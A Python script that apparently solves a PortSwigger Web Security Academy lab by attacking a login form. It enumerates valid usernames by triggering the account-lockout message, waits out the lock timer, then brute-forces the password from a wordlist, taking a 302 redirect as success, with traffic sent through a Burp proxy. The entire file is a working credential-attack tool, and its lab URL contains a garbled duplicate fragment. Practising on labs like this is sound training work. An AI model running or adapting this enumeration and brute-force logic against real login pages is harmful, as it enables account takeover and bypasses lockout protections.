import requests
import sys
import time

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net/rity-academy.net/"
LOGIN_URL = f"{LAB_URL}login"
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"

# Set proxies to view traffic live in Burp Suite, or change to None to run purely in terminal
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def read_file(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Error: '{filename}' not found.")
        sys.exit(1)

def find_valid_username(usernames):
    print("[*] Phase 1: Running consecutive account-lock identification...")
    
    for username in usernames:
        # Use a fresh standalone session context per username to protect counter logic
        session = requests.Session()
        
        # Fire 5 identical requests consecutively for this username
        for attempt in range(5):
            data = {"username": username, "password": f"wrong_password_{attempt}"}
            try:
                response = session.post(LOGIN_URL, data=data, proxies=proxies, verify=False)
                
                # The exact string PortSwigger sets for the account lockout event
                if "too many incorrect login attempts" in response.text.lower():
                    print(f"\n[+] Success! True Username Identified: {username}")
                    return username
            except Exception as e:
                print(f"\n[-] Network anomaly on {username}: {e}")
                time.sleep(2)
                
        sys.stdout.write(f"\r[*] Checked: {username}...")
        sys.stdout.flush()
        
    return None

def brute_force_password(username, passwords):
    print(f"\n[*] Phase 2: Extracting password for target user '{username}'...")
    print("[*] Waiting 65 seconds to allow the application's account lock tracker to reset completely...")
    
    for i in range(65, 0, -1):
        sys.stdout.write(f"\r[*] Timer reset progress: {i} seconds remaining... ")
        sys.stdout.flush()
        time.sleep(1)
    print("\n\n[*] Commencing target verification...")

    for count, password in enumerate(passwords, 1):
        session = requests.Session()
        data = {"username": username, "password": password}
        
        # allow_redirects=False lets us capture the exact 302 Found state safely
        response = session.post(LOGIN_URL, data=data, proxies=proxies, verify=False, allow_redirects=False)
        
        # If the valid credentials are hit, the application drops its 200 error state and drops a 302 Redirect
        if response.status_code == 302:
            print(f"\n[+] SUCCESS! Credentials Isolated -> {username}:{password}")
            return password
            
        sys.stdout.write(f"\r[*] Tested {count}/{len(passwords)} passwords...")
        sys.stdout.flush()
        
        # Small delay to keep the backend API stable during verification
        time.sleep(0.1)
        
    return None

def main():
    usernames = read_file(USERNAME_FILE)
    passwords = read_file(PASSWORD_FILE)
    
    valid_user = find_valid_username(usernames)
    if not valid_user:
        print("\n[-] Verification failed. Ensure the lab has not timed out.")
        return
        
    valid_pass = brute_force_password(valid_user, passwords)
    if valid_pass:
        print(f"\n[+] LAB COMPLETE! Log into your browser with -> {valid_user}:{valid_pass}")
    else:
        print("\n[-] Could not locate matching password.")

if __name__ == "__main__":
    main()


